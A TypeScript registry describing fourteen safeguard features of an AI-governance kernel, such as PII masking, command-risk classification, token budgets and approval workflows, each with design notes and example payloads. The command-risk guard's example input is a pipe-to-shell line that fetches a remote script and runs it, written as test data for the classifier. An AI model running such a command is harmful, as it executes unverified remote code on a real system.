import type { DecisionKind } from "@adjudicate/core";

/**
 * The capability catalogue — the single source of truth for the 14 things the
 * adjudicate kernel does, each mapped to a REAL package + a REAL ADR on disk.
 *
 * This registry is a *barrier*: the /capabilities index and the per-capability
 * detail pages all read from here, and `capabilities.test.ts` asserts that
 * every `adr.path` and `pkg.sourcePath` resolves to a file that exists. A
 * rename in `docs/architecture/adr/` or `packages/` therefore FAILS the test
 * rather than shipping a dead reference on the public site.
 *
 * Four families (matching the marketing taxonomy):
 *   - content-safety   — PII guard, Hallucination scoring, AI-BOM
 *   - adversarial      — Red Team, Behavioral drift, Command-risk guard
 *   - budget-integrity — Token-budget guard, Config integrity seal,
 *                        Policy-coherence analyzer
 *   - workflow         — Smart approval engine, Agent memory store,
 *                        Incident-response pack, Access-governance pack,
 *                        Release-gating extensions
 *
 * `tier` is now a MATURITY marker, not a page-completeness one: all 14
 * capabilities render a full /capabilities/[slug] deep-dive. Tier 1 (six) run
 * the real kernel or a live transparency projection; Tier 2 (eight) are
 * fixture-illustrative — a real replica record, a featured /console replica, a
 * pack's declared intents, or a titled illustrative explainer — each clearly
 * labelled. The registry test still asserts exactly six Tier-1 entries.
 */

export type CapabilityFamily =
  | "content-safety"
  | "adversarial"
  | "budget-integrity"
  | "workflow";

/**
 * How the capability's worked example is rendered:
 *   - live-kernel:  runs the real kernel server-side via `runPlayground`.
 *   - chart:        links to a public transparency projection.
 *   - receipt:      renders a REAL AuditRecord from the console-replica fixtures,
 *                   looked up by `recordHash` (e.g. the hallucinated record).
 *   - replica:      features the matching /console/<view> replica behind a
 *                   prominent "See it in the console" panel.
 *   - pack:         renders a governance pack's governed intents + outcomes
 *                   (illustrative — the pack is not installed in the web kernel).
 *   - illustration: a titled illustrative explainer card for capabilities with
 *                   no replica/transparency surface (design-time / upstream-only).
 */
export type WorkedExample =
  | {
      readonly kind: "live-kernel";
      readonly intentKind: string;
      readonly payload: Record<string, unknown>;
      readonly state?: unknown;
    }
  | { readonly kind: "chart"; readonly transparencyHref: string }
  | { readonly kind: "receipt"; readonly recordHash: string }
  | { readonly kind: "replica"; readonly replicaRoute: string }
  | {
      readonly kind: "pack";
      readonly intents: ReadonlyArray<string>;
      readonly outcomes: ReadonlyArray<DecisionKind>;
      readonly note?: string;
    }
  | {
      readonly kind: "illustration";
      readonly title: string;
      readonly body: string;
      readonly outcomes?: ReadonlyArray<DecisionKind>;
    };

export interface CapabilityContent {
  /** URL-stable identifier; also the /capabilities/[slug] segment. */
  readonly slug: string;
  readonly name: string;
  readonly family: CapabilityFamily;
  /**
   * Maturity marker (NOT page-completeness — all 14 render a full page):
   * 1 = real-kernel / live-projection deep-dive; 2 = fixture-illustrative.
   */
  readonly tier: 1 | 2;
  readonly oneLiner: string;
  /** Longer prose — what the capability actually does, mechanism-first. */
  readonly whatItDoes: string;
  /** The governing ADR. `path` is repo-root-relative and must exist. */
  readonly adr: { readonly id: string; readonly path: string };
  /** The implementing package. `sourcePath` is repo-root-relative + exists. */
  readonly pkg: { readonly name: string; readonly sourcePath: string };
  /** The decision outcomes this capability most produces. */
  readonly outcomes: ReadonlyArray<DecisionKind>;
  readonly workedExample: WorkedExample;
  /** Where the capability shows up in the operator console / public site. */
  readonly consoleAppearance: {
    readonly surface: string;
    readonly replicaRoute?: string;
    readonly transparencyRoute?: string;
  };
  /** Whether the worked example runs the real kernel or is illustrative. */
  readonly interactivity: "real-kernel" | "fixture-illustrative";
}

export const CAPABILITIES: ReadonlyArray<CapabilityContent> = [
  // ── Content & data safety ────────────────────────────────────────────────
  {
    slug: "pii-guard",
    name: "PII / data-classification guard",
    family: "content-safety",
    tier: 1,
    oneLiner:
      "Detects classified data (SSNs, cards, secrets) in an intent and REWRITEs the payload to mask it — taint preserved.",
    whatItDoes:
      "A factory-built guard scans the envelope payload against a sensitivity-tiered pattern set. On a match it does not refuse blindly; it returns a sanitised REWRITE intent with the matched fields masked, so the action still completes against safe data. Clean payloads pass through to EXECUTE untouched. Because matching happens inside the kernel, the redaction is part of the audited decision, not an after-the-fact log scrub.",
    adr: {
      id: "ADR-117",
      path: "docs/architecture/adr/ADR-117-data-classification-guard.md",
    },
    pkg: {
      name: "@adjudicate/primitives",
      sourcePath: "packages/primitives/src/guards.ts",
    },
    outcomes: ["REWRITE", "EXECUTE", "REFUSE"],
    workedExample: {
      kind: "live-kernel",
      intentKind: "support.ticket.create",
      payload: {
        subject: "Cannot log in",
        body: "My SSN is 123-45-6789 and card 4111111111111111, please help.",
      },
    },
    consoleAppearance: {
      surface: "PII Events drill-down + public PII-handling posture",
      transparencyRoute: "/transparency/pii",
    },
    interactivity: "real-kernel",
  },
  {
    slug: "hallucination-scoring",
    name: "Hallucination scoring",
    family: "content-safety",
    tier: 2,
    oneLiner:
      "Scores model output groundedness as an observability signal feeding release gates and drift, without perturbing the decision.",
    whatItDoes:
      "An observability-layer scorer attaches a groundedness/hallucination metric to a turn's telemetry. It is upstream-only: the score informs dashboards, release-gating thresholds and drift baselines, but is never an argument to the kernel decision — a low score widens what operators see, it does not silently alter an adjudication. The problem it solves: model output can be confidently wrong, and a guard that only checks structure can't tell. Reach for it when you ship LLM features whose answers feed downstream actions and you need an early-warning signal for ungrounded output. It pairs with Tier-1 capabilities as a downstream risk gate — feeding release-gating thresholds and drift baselines — which is why operators typically gate releases or escalate reviews when scores drop below a configured threshold, rather than waiting for a user to catch the error.",
    adr: {
      id: "ADR-124",
      path: "docs/architecture/adr/ADR-124-hallucination-scoring.md",
    },
    pkg: {
      name: "@adjudicate/observability",
      sourcePath: "packages/observability/src/hallucination.ts",
    },
    outcomes: ["ESCALATE", "EXECUTE"],
    workedExample: {
      kind: "receipt",
      // The hallucinated console-replica record (ADR-124): a large PIX refund
      // ESCALATEd to a supervisor, with metadata.hallucination_score = 1. The
      // groundedness signal rode alongside the audited decision without moving
      // it — exactly the upstream-only contract this capability documents.
      recordHash:
        "026a452517d96354928234a31db860bcb465a2f62eed446b0afd5b979fb38916",
    },
    consoleAppearance: {
      surface: "Observability hallucination metric (console telemetry panels)",
      replicaRoute:
        "/console/decision/026a452517d96354928234a31db860bcb465a2f62eed446b0afd5b979fb38916",
    },
    interactivity: "fixture-illustrative",
  },
  {
    slug: "ai-bom",
    name: "AI bill-of-materials",
    family: "content-safety",
    tier: 2,
    oneLiner:
      "Generates a signed manifest of every model, pack, guard and adapter in the deployment — a supply-chain inventory for AI.",
    whatItDoes:
      "The conformance package walks the installed packs, guards, models and adapters and emits a deterministic AI-BOM manifest: what is running, at what version, governed by which policies. It is the provenance artifact auditors ask for, and the public transparency view exposes aggregate composition without leaking tenant detail. The problem it solves: when a regulator or security review asks \"what AI is actually in production, and what governs it?\", most teams have to reconstruct the answer by hand. Reach for it when you owe an attestation — an EU AI Act conformance check, a SOC 2 inventory, an incident post-mortem. It composes with the rest of the kernel by inventorying the very guards and packs that enforce your Tier-1 decisions, so the same manifest that satisfies an auditor also tells you which capabilities defend each pack.",
    adr: {
      id: "ADR-127",
      path: "docs/architecture/adr/ADR-127-ai-bom.md",
    },
    pkg: {
      name: "@adjudicate/conformance",
      sourcePath: "packages/conformance/src/ai-bom.ts",
    },
    outcomes: ["EXECUTE"],
    workedExample: { kind: "replica", replicaRoute: "/console/ai-bom" },
    consoleAppearance: {
      surface: "AI-BOM Explorer + public bill-of-materials view",
      replicaRoute: "/console/ai-bom",
      transparencyRoute: "/transparency/ai-bom",
    },
    interactivity: "fixture-illustrative",
  },

  // ── Adversarial & behavioral ─────────────────────────────────────────────
  {
    slug: "red-team",
    name: "Red Team",
    family: "adversarial",
    tier: 1,
    oneLiner:
      "Runs a deterministic adversarial test suite against a policy bundle and reports how many attack vectors the kernel refused.",
    whatItDoes:
      "A seeded PRNG drives a catalogue of adversarial scenarios (prompt-injection, taint-laundering, privilege escalation) through the real kernel and records the decision for each. Determinism means the same seed reproduces the same run, so defense posture becomes a regression-testable number with a history, not a one-off pentest. The problem it solves: a guard that looked airtight last month can quietly regress after a policy edit or model swap, and you won't know until an attacker finds the gap. Reach for it in CI on every policy change and on a schedule against shipped packs. It is the proving ground for your Tier-1 guards — each scenario it defends is a PII, command-risk or budget rule holding under attack — so a regressed run is a direct signal that a guard needs investigation before release.",
    adr: {
      id: "ADR-118",
      path: "docs/architecture/adr/ADR-118-red-team.md",
    },
    pkg: {
      name: "@adjudicate/red-team",
      sourcePath: "packages/red-team/src/index.ts",
    },
    outcomes: ["REFUSE", "REWRITE", "ESCALATE"],
    workedExample: { kind: "chart", transparencyHref: "/transparency/red-team" },
    consoleAppearance: {
      surface: "Red Team section (run-history trend) + public defenses view",
      transparencyRoute: "/transparency/red-team",
    },
    interactivity: "fixture-illustrative",
  },
  {
    slug: "behavioral-drift",
    name: "Behavioral drift",
    family: "adversarial",
    tier: 1,
    oneLiner:
      "Detects statistical drift in the decision-outcome distribution over time, flagging silent behavioral regressions.",
    whatItDoes:
      "A detector compares a rolling window of decision-outcome distributions against a baseline using a distance metric, surfacing when the kernel's behavior shifts — e.g. a sudden spike in REWRITEs or a collapse in REFUSEs that would otherwise pass unnoticed. History is retained so drift can be trended and alerted on. The problem it solves: a model update, a new pack version, or a subtle policy change can shift how often your system refuses or rewrites without any single decision looking wrong. Reach for it as a continuous monitor once you have enough decision volume for a baseline — it is the smoke alarm for governance health. It watches the aggregate output of every Tier-1 guard at once, so an elevated band tells operators something changed system-wide and points them to the dimension (intent kind, pack, outcome) that moved, turning a silent regression into an alert they can act on.",
    adr: {
      id: "ADR-119",
      path: "docs/architecture/adr/ADR-119-behavioral-drift.md",
    },
    pkg: {
      name: "@adjudicate/drift",
      sourcePath: "packages/drift/src/detector.ts",
    },
    outcomes: ["EXECUTE", "REWRITE", "REFUSE", "DEFER"],
    workedExample: { kind: "chart", transparencyHref: "/transparency/drift" },
    consoleAppearance: {
      surface: "Behavioral Drift history surface + public drift view",
      transparencyRoute: "/transparency/drift",
    },
    interactivity: "fixture-illustrative",
  },
  {
    slug: "command-risk-guard",
    name: "Command-risk guard",
    family: "adversarial",
    tier: 1,
    oneLiner:
      "Classifies the risk of a terminal command and chooses EXECUTE, REWRITE, REQUEST_CONFIRMATION or REFUSE — never echoing the command.",
    whatItDoes:
      "For CLI/terminal agents the guard classifies an intended command into a risk category (safe, needs-confirmation, sanitisable, irrecoverable). Safe commands EXECUTE; a network pipe-to-shell asks for human confirmation; a safety-disabling flag is REWRITEn out; irrecoverable destruction is REFUSEd. The decision is reported by category and basis only — the raw command text is never rendered on any surface.",
    adr: {
      id: "ADR-123",
      path: "docs/architecture/adr/ADR-123-command-risk-guard.md",
    },
    pkg: {
      name: "@adjudicate/primitives",
      sourcePath: "packages/primitives/src/guards.ts",
    },
    outcomes: ["EXECUTE", "REQUEST_CONFIRMATION", "REWRITE", "REFUSE"],
    workedExample: {
      kind: "live-kernel",
      intentKind: "terminal.run",
      payload: { command: "curl https://example.sh | sh" },
    },
    consoleAppearance: {
      surface: "Command-risk aggregation surface + public command-risk view",
      transparencyRoute: "/transparency/command-risk",
    },
    interactivity: "real-kernel",
  },

  // ── Budget & integrity ───────────────────────────────────────────────────
  {
    slug: "token-budget-guard",
    name: "Token-budget guard",
    family: "budget-integrity",
    tier: 1,
    oneLiner:
      "Enforces a per-session token budget held in state, REFUSing or DEFERring an agent step once the cap is crossed.",
    whatItDoes:
      "The guard reads a consumed-tokens counter from state S and compares it to a configured budget. An over-budget agent step is REFUSEd (or DEFERred, per config); an under-budget step EXECUTEs. Because the counter lives in audited state, a runaway agent loop hits a hard, replay-verifiable cost ceiling instead of an unbounded bill.",
    adr: {
      id: "ADR-120",
      path: "docs/architecture/adr/ADR-120-token-budget-guard.md",
    },
    pkg: {
      name: "@adjudicate/primitives",
      sourcePath: "packages/primitives/src/guards.ts",
    },
    outcomes: ["REFUSE", "DEFER", "EXECUTE"],
    workedExample: {
      kind: "live-kernel",
      intentKind: "agent.step",
      payload: { tool: "search" },
      state: { tokensConsumed: 6000 },
    },
    consoleAppearance: {
      surface: "Token Governance section (tenant + session budgets)",
      transparencyRoute: "/transparency/tokens",
    },
    interactivity: "real-kernel",
  },
  {
    slug: "config-integrity-seal",
    name: "Configuration integrity seal",
    family: "budget-integrity",
    tier: 2,
    oneLiner:
      "Seals the active policy/pack configuration into a verifiable hash so tampering or drift from the approved config is detectable.",
    whatItDoes:
      "The conformance package computes a deterministic seal over the loaded configuration (packs, policies, thresholds). At runtime the seal is checked against the approved value, so an unauthorised edit to what the kernel enforces is caught and surfaced — the public integrity view shows the seal's health without exposing the configuration itself. The problem it solves: your guards are only as trustworthy as the configuration they run, and a quiet edit to a threshold or a swapped pack can weaken every decision after it. Reach for it the moment your policy config becomes change-controlled — when an unapproved edit should be an incident, not a deploy. It is the integrity floor under every Tier-1 capability: the seal proves the PII, command-risk and budget rules in force are exactly the ones you approved, so when the seal verifies, operators can trust the decisions; when it drifts, they know the config moved before the kernel ever does.",
    adr: {
      id: "ADR-121",
      path: "docs/architecture/adr/ADR-121-config-integrity-seal.md",
    },
    pkg: {
      name: "@adjudicate/conformance",
      sourcePath: "packages/conformance/src/config-seal.ts",
    },
    outcomes: ["EXECUTE", "REFUSE"],
    workedExample: { kind: "replica", replicaRoute: "/console/integrity" },
    consoleAppearance: {
      surface: "Configuration Integrity aggregation + public integrity view",
      replicaRoute: "/console/integrity",
      transparencyRoute: "/transparency/integrity",
    },
    interactivity: "fixture-illustrative",
  },
  {
    slug: "policy-coherence-analyzer",
    name: "Policy-coherence analyzer",
    family: "budget-integrity",
    tier: 2,
    oneLiner:
      "Statically analyses a policy bundle for contradictions, dead rules and unreachable outcomes before it ships.",
    whatItDoes:
      "A Tier-3 analyzer inspects a policy bundle as a whole and reports diagnostics: rules that can never fire, outcomes shadowed by an earlier phase, contradictory thresholds. It is a design-time lint for governance — catching an incoherent policy in CI rather than as a production surprise. The problem it solves: live tests only exercise the rules they happen to hit, so a dead rule or a contradiction can sit unnoticed until exactly the wrong envelope arrives. Reach for it in CI before a policy ships — run this design-time linter on the bundle source to surface structural issues no live test can find. It is the upstream complement to Red Team's runtime probing: where Red Team proves your guards hold under attack, the analyzer proves the policy is internally coherent in the first place — letting teams fix the bundle before a policy reaches production.",
    adr: {
      id: "ADR-125",
      path: "docs/architecture/adr/ADR-125-policy-coherence-analyzer.md",
    },
    pkg: {
      name: "@adjudicate/analyze",
      sourcePath: "packages/analyze/src/tier3.ts",
    },
    outcomes: ["REFUSE", "REWRITE"],
    workedExample: {
      kind: "illustration",
      title: "A structured conflict check, before the policy ships",
      body:
        "The AJD-301 analyzer (Tier-3) reads a policy bundle as a whole and reports structured diagnostics: a rule whose guard can never be satisfied, an outcome shadowed by an earlier phase, two thresholds that contradict each other. It is a design-time lint — it runs in CI against the bundle source, not against any live envelope, so it has no runtime decision, no replica row and no transparency projection. The payoff is catching an incoherent policy as a failed check rather than as a production surprise.",
    },
    consoleAppearance: {
      surface: "Analyze CLI / CI diagnostics (design-time, no console surface)",
    },
    interactivity: "fixture-illustrative",
  },

  // ── Workflow & governance ────────────────────────────────────────────────
  {
    slug: "smart-approval-engine",
    name: "Smart approval engine",
    family: "workflow",
    tier: 2,
    oneLiner:
      "Orchestrates human approvals for ESCALATEd intents — registry, channels and a resolvable decision the kernel can resume on.",
    whatItDoes:
      "When the kernel ESCALATEs, the approval engine parks the request in a registry, routes it to an approval channel, and exposes a resolvable handle. Once a human decides, the original intent resumes through the kernel with the approval recorded — turning ESCALATE from a dead-end into an auditable, resumable human-in-the-loop step. The problem it solves: without it, an ESCALATE just stops the agent — there is nowhere for the request to wait, no one notified, no clean way to pick it back up. Reach for it whenever some actions are too consequential to fully automate but too frequent to handle out-of-band: large refunds, sensitive-resource grants, destructive deploys. It is the workflow that makes every Tier-1 ESCALATE actionable — the registry it persists, the channel it routes to, and the audit chain a resolved approval resumes through turn human review into a first-class, replayable part of the decision.",
    adr: {
      id: "ADR-122",
      path: "docs/architecture/adr/ADR-122-approval-engine.md",
    },
    pkg: {
      name: "@adjudicate/approval-engine",
      sourcePath: "packages/approval-engine/src/engine.ts",
    },
    outcomes: ["ESCALATE", "EXECUTE", "REFUSE"],
    workedExample: { kind: "replica", replicaRoute: "/console/approvals" },
    consoleAppearance: {
      surface: "Approval Center (persisted registry + decision history + audit chain)",
      replicaRoute: "/console/approvals",
    },
    interactivity: "fixture-illustrative",
  },
  {
    slug: "agent-memory-store",
    name: "Agent memory store",
    family: "workflow",
    tier: 2,
    oneLiner:
      "Cross-session planner context that flows upstream into the prompt only — never into the hash, state or any guard.",
    whatItDoes:
      "A MemoryStore folds past decisions and domain knowledge into the planner's context once per iteration, feeding both plan and prompt. Critically it is upstream-only: memory is type M, distinct from state S, and is never an argument to the envelope, adjudicate or any guard — so given identical (envelope, state, policy) the kernel decision is byte-identical with or without memory. A poisoned memory can at most widen what the model is shown; it cannot move a decision. The problem it solves: agents that forget across sessions repeat work and lose context, but the usual fix — feeding history straight into the decision path — opens a memory-poisoning attack surface. Reach for it when you want cross-session continuity (a planner that remembers prior outcomes and domain facts) without trusting that memory with authority. It is deliberately isolated from every Tier-1 guard: memory enriches what the model proposes, but the kernel still adjudicates the proposal under the same deterministic rules, so better recall never becomes a weaker decision.",
    adr: {
      id: "ADR-126",
      path: "docs/architecture/adr/ADR-126-agent-memory-store.md",
    },
    pkg: {
      name: "@adjudicate/adapter-core",
      sourcePath: "packages/adapter-core/src/persistence.ts",
    },
    outcomes: ["EXECUTE", "REFUSE"],
    workedExample: {
      kind: "illustration",
      title: "Memory enriches context — never the decision",
      body:
        "The MemoryStore (ADR-126) folds past decisions and domain knowledge into the planner's context once per iteration, so the model sees more relevant history. Memory is type M, kept strictly distinct from state S, and is never an argument to the envelope, to adjudicate, or to any guard. The guarantee is determinism: given identical (envelope, state, policy) the kernel decision is byte-identical with or without memory. A poisoned memory can at most widen what the model is shown — it cannot move an adjudication — which is why there is no decision row to feature here.",
    },
    consoleAppearance: {
      surface: "SessionMemoryPanel on the console decision-detail page",
    },
    interactivity: "fixture-illustrative",
  },
  {
    slug: "incident-response-pack",
    name: "Incident-response pack",
    family: "workflow",
    tier: 2,
    oneLiner:
      "A governance pack for AI-driven incident remediation that exercises all six outcomes — clamping blast radius and gating destructive ops.",
    whatItDoes:
      "The pack governs an incident → remediation lifecycle: it DEFERs while a dependent service is down, REWRITEs an untrusted auto-remediation's blast radius down to bounds, ESCALATEs when an operator exceeds the radius threshold, REQUEST_CONFIRMATIONs before destructive remediation, and REFUSEs unknown or already-resolved incidents. A worked lighthouse for the decision algebra in an ops setting. The problem it solves: AI-driven remediation is fast but blunt — left unchecked it can amplify an outage by acting on a stale or oversized fix. Reach for it when you let agents touch production during incidents and need bounded autonomy: who can trigger a fix, what blast radius is safe, and when a human must sign off. It composes the Tier-1 primitives into a domain workflow — the same clamp, escalate and confirm decisions, wired to incident semantics — so an infra team gets least-blast-radius remediation without writing the algebra from scratch.",
    adr: {
      id: "ADR-116",
      path: "docs/architecture/adr/ADR-116-post-v1-extension-discipline.md",
    },
    pkg: {
      name: "@adjudicate/pack-incident-response",
      sourcePath: "packages/pack-incident-response/src/index.ts",
    },
    outcomes: ["DEFER", "REWRITE", "ESCALATE", "REQUEST_CONFIRMATION", "REFUSE", "EXECUTE"],
    workedExample: {
      kind: "pack",
      // The pack's real governed intents (packages/pack-incident-response/src/index.ts).
      intents: [
        "incident.remediation.execute",
        "incident.escalate",
        "incident.monitor.callback",
      ],
      outcomes: ["ESCALATE", "DEFER", "REQUEST_CONFIRMATION", "REWRITE"],
      note: "Illustrative — the incident-response pack is not installed in the web kernel-runner, so these are the pack's declared intents and the outcomes its policies most produce, not a live run.",
    },
    consoleAppearance: {
      surface: "Pack catalogue / Decision Lab (incident-response scenarios)",
    },
    interactivity: "fixture-illustrative",
  },
  {
    slug: "access-governance-pack",
    name: "Access-governance pack",
    family: "workflow",
    tier: 2,
    oneLiner:
      "A governance pack for agent access requests — least-privilege clamps, sensitive-resource escalation and confirmed revokes.",
    whatItDoes:
      "The pack governs an access request → review → grant/revoke lifecycle across all six outcomes: DEFER a request with no resolved review, REWRITE an over-provisioned request down to least privilege, ESCALATE sensitive-resource access to a human reviewer, REQUEST_CONFIRMATION before a destructive revoke, REFUSE unknown resources or rejected reviews. Justification text is PII-classified per the data-classification guard. The problem it solves: agents (and the humans behind them) tend to over-ask for access, and ad-hoc grant flows drift toward over-privilege and unsafe revokes. Reach for it when AI or automation participates in access decisions and you want least-privilege enforced by default: down-scope what's over-provisioned, escalate the sensitive, confirm before destroying. It wires the Tier-1 primitives into an access-control domain — and leans on the PII / data-classification guard to keep justification text safe — so an access workflow inherits the same auditable, six-outcome discipline as the rest of the kernel.",
    adr: {
      id: "ADR-116",
      path: "docs/architecture/adr/ADR-116-post-v1-extension-discipline.md",
    },
    pkg: {
      name: "@adjudicate/pack-access-governance",
      sourcePath: "packages/pack-access-governance/src/index.ts",
    },
    outcomes: ["DEFER", "REWRITE", "ESCALATE", "REQUEST_CONFIRMATION", "REFUSE", "EXECUTE"],
    workedExample: {
      kind: "pack",
      // The pack's real governed intents (packages/pack-access-governance/src/index.ts).
      intents: ["access.request", "access.review.resolve", "access.revoke"],
      outcomes: ["DEFER", "REFUSE", "REWRITE", "ESCALATE"],
      note: "Illustrative — the access-governance pack is not installed in the web kernel-runner, so these are the pack's declared intents and the outcomes its policies most produce, not a live run.",
    },
    consoleAppearance: {
      surface: "Pack catalogue / Decision Lab (access-governance scenarios)",
    },
    interactivity: "fixture-illustrative",
  },
  {
    slug: "release-gating",
    name: "Release-gating extensions",
    family: "workflow",
    tier: 1,
    oneLiner:
      "Deployment-approval gates: clamp production ramp, escalate un-approved or low-eval-score releases, green-region carbon clamp.",
    whatItDoes:
      "The deployments-approval pack adjudicates a release request through layered gates: it REWRITEs a production ramp above the cap down to the maximum, ESCALATEs a production deploy with no recorded approval, ESCALATEs when an AI eval/regression score drops below threshold, and REWRITEs the region to the greenest one within the same data-residency zone (a zone-bounded carbon clamp that never crosses a GDPR boundary). Clean, in-bounds requests EXECUTE.",
    adr: {
      id: "ADR-116",
      path: "docs/architecture/adr/ADR-116-post-v1-extension-discipline.md",
    },
    pkg: {
      name: "@adjudicate/pack-deployments-approval",
      sourcePath: "packages/pack-deployments-approval/src/policies.ts",
    },
    outcomes: ["EXECUTE", "REWRITE", "ESCALATE", "DEFER", "REQUEST_CONFIRMATION"],
    workedExample: {
      kind: "live-kernel",
      intentKind: "deployment.approval.request",
      payload: {
        service: "api",
        environment: "production",
        gitSha: "feedfacefeedface",
        rampPercent: 100,
      },
    },
    consoleAppearance: {
      surface: "Deployments Flow + Decision Lab (deployments-approval presets)",
      replicaRoute: "/console",
    },
    interactivity: "real-kernel",
  },
];
